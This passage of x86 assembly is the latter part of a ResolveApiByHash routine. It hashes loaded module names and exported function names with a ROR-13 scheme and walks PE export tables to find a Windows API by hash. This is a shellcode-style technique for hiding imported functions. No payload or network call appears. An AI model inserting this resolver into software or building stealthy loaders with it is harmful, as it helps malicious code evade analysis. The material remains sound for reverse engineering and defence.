    movzx ebx, word ptr [edx + 24h]      ; BaseDllName.Length
    xor  edi, edi

Api_ModuleHash:
    xor  eax, eax
    lodsb
    cmp  al, 'a'
    jl   Api_ModuleChar
    sub  al, 20h
Api_ModuleChar:
    ror  edi, 0Dh
    add  edi, eax
    dec  ebx
    jnz  Api_ModuleHash

    push ecx
    push edx
    push edi

    mov  ebx, [edx + 10h]                ; DllBase
    mov  eax, [ebx + 3Ch]
    add  eax, ebx
    cmp  dword ptr [eax], 00004550h
    jne  Api_AdvanceModule

    mov  eax, [eax + 78h]                ; export RVA
    test eax, eax
    jz   Api_AdvanceModule
    add  eax, ebx
    mov  edx, eax                        ; IMAGE_EXPORT_DIRECTORY

    mov  ecx, [edx + 18h]                ; NumberOfNames
    mov  edi, [edx + 20h]                ; AddressOfNames
    add  edi, ebx

Api_NextFunction:
    test ecx, ecx
    jz   Api_AdvanceModule
    dec  ecx

    mov  eax, [edi + ecx * 4]
    add  eax, ebx
    push ecx
    push edx
    push edi
    mov  esi, eax
    call Ror13HashNTStr                  ; EDI = function hash
    add  edi, [esp + 0Ch]                ; saved module hash
    cmp  edi, [ebp - CTX_TMP]
    pop  edi
    pop  edx
    pop  ecx
    jne  Api_NextFunction

    mov  eax, [edx + 24h]                ; AddressOfNameOrdinals
    add  eax, ebx
    movzx ecx, word ptr [eax + ecx * 2]
    mov  eax, [edx + 1Ch]                ; AddressOfFunctions
    add  eax, ebx
    mov  eax, [eax + ecx * 4]
    add  eax, ebx
    add  esp, 0Ch
    ret

Api_AdvanceModule:
    pop  edi
    pop  edx
    pop  ecx
    mov  edx, [edx]
    jmp  Api_NextModule

Api_Fail:
    xor  eax, eax
    ret
ResolveApiByHash endp

end
